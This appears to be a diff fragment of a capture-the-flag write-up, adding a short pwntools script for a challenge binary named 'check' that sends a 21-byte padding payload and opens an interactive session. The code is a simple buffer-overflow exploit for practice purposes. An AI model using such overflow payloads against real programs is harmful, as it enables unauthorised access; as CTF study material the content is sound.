@@ -11,4 +11,11 @@ io.interactive()
 # ***check***
 
 ```
+from pwn import*
+io = process("./check")
+payload = b"A"*21
+io.sendline(payload)
+io.interactive()
+```
 
+# ***
